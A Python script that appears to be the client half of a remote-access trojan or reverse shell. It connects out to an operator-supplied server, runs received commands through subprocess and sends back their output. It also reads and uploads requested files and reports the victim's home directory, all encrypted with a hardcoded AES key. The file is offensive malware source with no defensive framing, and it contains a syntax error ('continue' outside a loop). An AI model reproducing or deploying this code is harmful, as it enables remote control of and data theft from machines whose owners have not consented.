#!/usr/bin/python3
import socket, sys, os, subprocess, argparse, time
from struct import pack
from Crypto.Cipher import AES
parser = argparse.ArgumentParser(description='q*bert says hello')
parser.add_argument('-p', dest='port', required=True, type=int)
parser.add_argument('-s', dest='server', required=True)
args = parser.parse_args()

def do_encrypt(message):
    if isinstance(message, bytes):
        continue
    else:
        plain = bytes(message, 'utf-8')
    length = 16 - (len(plain) % 16)
    plain += bytes([length])*length
    obj = AES.new('This is a key123', AES.MODE_CBC, 'This is an IV456')
    cipher = obj.encrypt(plain)
    return cipher

def main():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    buff = 4096
    s.connect((args.server, args.port))
    output = 'NSTR'
    while True:
        try:
            received = s.recv(buff).strip().split()
            command = [ str(x, 'utf-8') for x in received ]
            if 'cmd' in command:
                del command[0]
                print(command)
                output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                sendit(s, output.stdout + output.stderr)
            elif 'Arsenal' in command:
                sendit(s, 'Client initial checkin\nHomedir: %s\n' %os.environ.get('HOME'))
            elif 'get_file' in command:
                with open(command[1]) as f:
                    tmp = f.read()
                sendit(s, bytes(tmp))
        except socket.error as err:
            print("{0}\n".format(err))

def sendit(s, output):
    message = do_encrypt(output)
    print(message)
    length = pack('>Q', len(message))
    s.sendall(length)
    s.sendall(message)

if __name__ == '__main__':
    main()
